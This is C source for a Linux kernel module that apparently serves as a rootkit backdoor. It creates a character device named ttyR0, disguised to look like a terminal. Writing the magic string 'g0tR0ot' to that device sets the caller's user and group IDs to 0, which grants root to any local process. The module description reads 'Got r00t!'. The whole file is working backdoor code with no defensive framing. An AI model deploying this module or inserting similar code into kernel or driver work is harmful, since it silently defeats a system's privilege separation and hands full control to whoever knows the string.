#include <linux/init.h>   
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>    
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

#define  DEVICE_NAME "ttyR0" 
#define  CLASS_NAME  "ttyR"  

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

// Prototypes
static int     __init root_init(void);
static void    __exit root_exit(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);


// Module info
MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("pico");
MODULE_DESCRIPTION("Got r00t!."); 
MODULE_VERSION("0.1"); 

static int            majorNumber; 
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   magic[] = "g0tR0ot";
  struct cred *new_cred;
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
    {
      copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
	  {
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk ("ttyRK: Cannot prepare credentials\n");
		return 0;
	      }
	    printk ("ttyRK: You got it.\n");
	    V(new_cred->uid) = V(new_cred->gid) =  0;
	    V(new_cred->euid) = V(new_cred->egid) = 0;
	    V(new_cred->suid) = V(new_cred->sgid) = 0;
	    V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
	    commit_creds (new_cred);
	  }
        kfree(data);
      }
    else
      {
	printk(KERN_ALERT "ttyRK:Unable to allocate memory");
      }
    
    return len;
}


static int __init
root_init(void)
{
  printk ("ttyRK: LKM installed!\n");
  // Create char device
  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
    {
      printk(KERN_ALERT "ttyRK failed to register a major number\n");
      return majorNumber;
    }
   printk(KERN_INFO "ttyRK: major number %d\n", majorNumber);
 
   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to register device class\n");
       return PTR_ERR(rootcharClass); 
   }

   printk(KERN_INFO "ttyRK: device class registered correctly\n");
 
   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
     {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to create the device\n");
       return PTR_ERR(rootcharDevice);
     }

    return 0;
    
}

static void __exit
root_exit(void) 
{
  // Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);                     
  class_destroy(rootcharClass);                        
  unregister_chrdev(majorNumber, DEVICE_NAME);     

  printk("ttyRK:Bye!\n");
}


module_init(root_init);
module_exit(root_exit);